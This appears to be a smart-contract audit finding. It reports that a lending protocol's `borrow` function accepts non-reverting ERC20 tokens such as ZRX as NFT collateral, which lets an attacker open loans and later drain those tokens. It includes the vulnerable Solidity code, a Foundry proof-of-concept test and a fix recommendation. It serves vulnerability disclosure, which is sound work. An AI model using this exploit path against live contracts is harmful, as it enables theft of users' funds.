# no-revert-on-transfer ERC20 tokens can be drained.

## Summary

Some ERC20 tokens don’t revert but just return false when a transfer fails. This can be abused to trick `borrow` function to initialise a loan without providing any tokens. A good example of such a token is *ZRX*: [[Etherscan code](https://etherscan.io/address/0xe41d2489571d322189246dafa5ebde1f4699f498#code#L64)](https://etherscan.io/address/0xe41d2489571d322189246dafa5ebde1f4699f498#code#L64) . The issue is because the borrow function doesn’t verify if the provided collateral is ERC20 or ERC721, and thus both can be used here. 

## Vulnerability Detail

An attacker can first sign and approve any valid erc20 token to create a valid offer as a lender ( but with collateral as the ERC20 token discussed above, this is they key point of the attack). 

The attacker then needs to call `borrow` with that offer and the nft as the ERC20 token discussed above. The line 3 would pass even if the transaction fails:

```solidity
function borrow(BorrowArg[] calldata args) external {
        for (uint256 i = 0; i < args.length; i++) {
            args[i].nft.implem.transferFrom(msg.sender, address(this), args[i].nft.id); //would not revert in case of no-revert-on-transfer tokens
            useCollateral(args[i].args, msg.sender, args[i].nft);
        }
    }
```

The useCollateral function would create a new loan with the collateral as the ERC20 token. I’ve created a test case that shows that an erc20 token can be used as collateral. 

```solidity
function testNonrevertErc20() public {
        money.mint(10000,BORROWER);
        vm.prank(BORROWER);
        money.approve(address(kairos),10000);
        NFToken memory nftoken = NFToken({implem: IERC721(address(money)), id: 10000});
        
        money2.mint(10 ether,signer);
        vm.prank(signer);
        money2.approve(address(kairos),10 ether);

        money2.allowance(signer,address(kairos));

        Offer memory offer = Offer({
                assetToLend: money2,
                loanToValue: 10 ether,
                duration: 2 weeks,
                expirationDate: block.timestamp + 2 hours,
                tranche: 0,
                collateral: nftoken
            });
        OfferArg[] memory offArgs = getOfferArgs(offer);
        BorrowArg[] memory args = new BorrowArg[](1);
        args[0] = BorrowArg({nft: nftoken, args: offArgs});
        args[0].args[0].amount = 1 ether;
        vm.prank(BORROWER);
        kairos.borrow(args);
    }
```

Now when there are enough of those non revert erc20 tokens in the contract, the attacker can liquidate their position and thus can get the erc20 tokens to themselves even when they didn’t send those to the contract ( as the transaction can be silently failed ).

## Impact

Non-revert erc20 tokens can be drained.

## Recommendation

`supportsInterface` can be used here to check, prior to doing any calls in borrow function.
